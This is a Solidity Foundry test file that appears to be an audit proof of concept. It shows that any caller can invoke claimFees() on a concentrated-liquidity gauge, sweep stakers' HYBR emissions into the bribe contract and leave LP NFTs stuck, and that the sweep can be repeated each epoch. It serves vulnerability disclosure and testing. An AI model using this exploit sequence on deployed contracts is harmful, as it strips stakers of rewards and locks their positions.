// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "./CLGaugeBase.t.sol";

/// Lead: GaugeCL._claimFees treats the gauge's ENTIRE token0/token1 balance as fees.
/// For a CL pool that contains HYBR (the gauge's emission token), anyone can call claimFees()
/// and ship the stakers' undistributed emissions to the internal bribe (voters).
contract ClaimFeesSweepTest is CLGaugeBase {
    function test_sanity_stakeAndEarn() public {
        uint256 id = mintPosition(lpUser, -1000, 1000, 1000e18);
        stake(lpUser, id);
        fundEmissions(700_000e18);
        vm.warp(block.timestamp + 1 days);
        uint256 before = hybr.balanceOf(lpUser);
        vm.prank(lpUser);
        gauge.withdraw(id, 0); // redeemType 0 = TO_HYBR
        uint256 got = hybr.balanceOf(lpUser) - before;
        emit log_named_decimal_uint("lp got HYBR (withdraw + rewards)", got, 18);
        assertGt(got, 0);
        assertEq(nfpm.ownerOf(id), lpUser, "control: normal withdraw returns NFT");
    }

    function test_anyoneSweepsEmissionsIntoBribe_andStakersCannotWithdraw() public {
        uint256 id = mintPosition(lpUser, -1000, 1000, 1000e18);
        stake(lpUser, id);
        fundEmissions(700_000e18);
        uint256 gaugeHybr = hybr.balanceOf(address(gauge));
        assertEq(gaugeHybr, 700_000e18);

        vm.warp(block.timestamp + 1 days);

        address bribe = gauge.internal_bribe();
        uint256 bribeBefore = hybr.balanceOf(bribe);
        vm.prank(attacker);
        gauge.claimFees();

        // all emissions left the gauge and became "fees" for voters
        assertEq(hybr.balanceOf(address(gauge)), 0, "gauge emissions swept");
        assertEq(hybr.balanceOf(bribe) - bribeBefore, 700_000e18, "bribe received emissions");

        // staker now cannot withdraw their NFT: _getReward tries to pay rewards the gauge no longer holds
        vm.prank(lpUser);
        vm.expectRevert(stdError.arithmeticError); // HYBR balance underflow: gauge has nothing left to pay rewards with
        gauge.withdraw(id, 0);
        assertEq(nfpm.ownerOf(id), address(gauge), "LP's NFT stuck in gauge");
    }
}

/// Escalation check: after a sweep, can a later notify in the same period revert (blocking distribution)?
contract ClaimFeesSweepNotifyTest is CLGaugeBase {
    function test_sweepThenSecondNotifySamePeriod() public {
        uint256 id = mintPosition(lpUser, -1000, 1000, 1000e18);
        stake(lpUser, id);
        fundEmissions(700_000e18);
        vm.warp(block.timestamp + 60);
        vm.prank(attacker);
        gauge.claimFees();
        // a second notification in the same epoch now fails the balance sanity check
        hybr.transfer(address(gaugeManager), 1_000e18);
        vm.prank(address(gaugeManager));
        vm.expectRevert(bytes("Insufficient balance for reward rate"));
        gauge.notifyRewardAmount(address(hybr), 1_000e18);
    }

    /// Next epoch's first notification still works (so no permanent distribution DoS), but the
    /// swept amount is gone and can be swept again after every notification.
    function test_nextEpochNotifyWorksButCanBeSweptAgain() public {
        uint256 id = mintPosition(lpUser, -1000, 1000, 1000e18);
        stake(lpUser, id);
        fundEmissions(700_000e18);
        vm.prank(attacker);
        gauge.claimFees();
        vm.warp((block.timestamp / 1800 + 1) * 1800 + 1);
        fundEmissions(700_000e18);
        assertEq(hybr.balanceOf(address(gauge)), 700_000e18);
        vm.prank(attacker);
        gauge.claimFees();
        assertEq(hybr.balanceOf(address(gauge)), 0);
    }
}
